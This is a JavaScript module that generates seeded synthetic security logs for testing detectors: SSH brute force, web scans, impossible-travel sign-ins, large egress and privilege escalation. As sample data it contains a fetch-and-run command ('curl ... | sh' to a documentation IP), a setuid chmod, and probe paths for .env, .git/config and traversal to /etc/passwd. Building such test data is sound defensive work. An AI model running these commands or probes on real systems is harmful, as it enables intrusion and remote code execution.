// src/security_logs.js
// Synthetic security log corpus for detection testing (EvidenceForge-style).
// Deterministic given a seed, so tests can assert on output.
const SCENARIOS = [
  {
    id: 'brute-force-ssh',
    label: 'SSH brute force',
    base: { service: 'sshd', action: 'auth', outcome: 'failure' },
    generate: (rnd, n) => Array.from({ length: n }, (_, i) => ({
      ts: new Date(Date.UTC(2026, 0, 1, 0, i)).toISOString(),
      service: 'sshd', action: 'auth', outcome: 'failure',
      user: ['root', 'admin', 'ubuntu', 'oracle'][i % 4],
      src_ip: '203.0.113.' + (10 + (i % 40)),
      detail: 'Failed password for invalid user',
    })),
  },
  {
    id: 'web-scan',
    label: 'Web vulnerability scan',
    paths: ['/wp-admin', '/.env', '/phpmyadmin', '/../etc/passwd', '/admin.php', '/.git/config'],
    generate: (rnd, n) => Array.from({ length: n }, (_, i) => ({
      ts: new Date(Date.UTC(2026, 0, 1, 1, i)).toISOString(),
      service: 'nginx', action: 'http', outcome: 'not_found',
      src_ip: '198.51.100.' + (2 + (i % 12)),
      path: ['/wp-admin', '/.env', '/phpmyadmin', '/../../etc/passwd', '/admin.php', '/.git/config'][i % 6],
      status: 404,
      ua: 'Mozilla/5.0 (compatible; Nuclei)',
    })),
  },
  {
    id: 'impossible-travel',
    label: 'Impossible travel sign-in',
    generate: (rnd, n) => Array.from({ length: n }, (_, i) => ({
      ts: new Date(Date.UTC(2026, 0, 1, 2, i * 7)).toISOString(),
      service: 'idp', action: 'signin', outcome: 'success',
      user: 'jane.doe@example.internal',
      geo: i % 2 === 0 ? 'US-OR' : 'SG-01',
      src_ip: i % 2 === 0 ? '192.0.2.' + (i + 1) : '198.51.100.' + (i + 1),
      mfa: false,
    })),
  },
  {
    id: 'data-exfil',
    label: 'Large outbound transfer',
    generate: (rnd, n) => Array.from({ length: n }, (_, i) => ({
      ts: new Date(Date.UTC(2026, 0, 1, 3, i)).toISOString(),
      service: 'proxy', action: 'egress', outcome: 'allowed',
      src_ip: '10.0.4.' + (20 + i),
      dest: '203.0.113.' + (7 + i),
      bytes: 50 * 1024 * 1024 + i * 1024,
      proto: 'https',
    })),
  },
  {
    id: 'priv-esc',
    label: 'Privilege escalation attempt',
    generate: (rnd, n) => Array.from({ length: n }, (_, i) => ({
      ts: new Date(Date.UTC(2026, 0, 1, 4, i)).toISOString(),
      service: 'auditd', action: 'exec', outcome: i % 3 === 0 ? 'denied' : 'success',
      user: 'www-data', uid: 33,
      cmd: ['sudo -i', 'chmod u+s /tmp/x', 'curl http://203.0.113.9/x.sh | sh'][i % 3],
    })),
  },
];

function mulberry32(seed) {
  let a = seed >>> 0;
  return function () {
    a |= 0; a = (a + 0x6D2B79F5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function generate(opts) {
  opts = opts || {};
  const seed = opts.seed != null ? opts.seed : 42;
  const perScenario = opts.perScenario || 12;
  const rnd = mulberry32(seed);
  const scenarios = opts.ids ? SCENARIOS.filter((s) => opts.ids.includes(s.id)) : SCENARIOS;
  const log = [];
  for (const s of scenarios) log.push(...s.generate(rnd, perScenario));
  log.sort((a, b) => String(a.ts).localeCompare(String(b.ts)));
  return {
    seed,
    scenarios: scenarios.map((s) => ({ id: s.id, label: s.label })),
    events: log,
    summary: { scenarios: scenarios.length, events: log.length },
  };
}

function toJsonl(doc) { return doc.events.map((e) => JSON.stringify(e)).join('\n') + '\n'; }

function toCsv(doc) {
  const keys = Array.from(new Set(doc.events.flatMap((e) => Object.keys(e))));
  const esc = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
  const lines = [keys.join(',')];
  for (const e of doc.events) lines.push(keys.map((k) => esc(e[k])).join(','));
  return lines.join('\n') + '\n';
}

// Simple detection expectations, useful for scoring a detector.
function expectations(doc) {
  const byService = {};
  for (const e of doc.events) byService[e.service] = (byService[e.service] || 0) + 1;
  return {
    bruteForce: doc.events.filter((e) => e.service === 'sshd' && e.outcome === 'failure').length,
    webScan: doc.events.filter((e) => e.service === 'nginx' && e.status === 404).length,
    impossibleTravel: doc.events.filter((e) => e.service === 'idp' && e.mfa === false).length,
    largeEgress: doc.events.filter((e) => (e.bytes || 0) > 10 * 1024 * 1024).length,
    privilegeEscalation: doc.events.filter((e) => e.service === 'auditd').length,
    byService,
  };
}

module.exports = { SCENARIOS, generate, toJsonl, toCsv, expectations, mulberry32 };
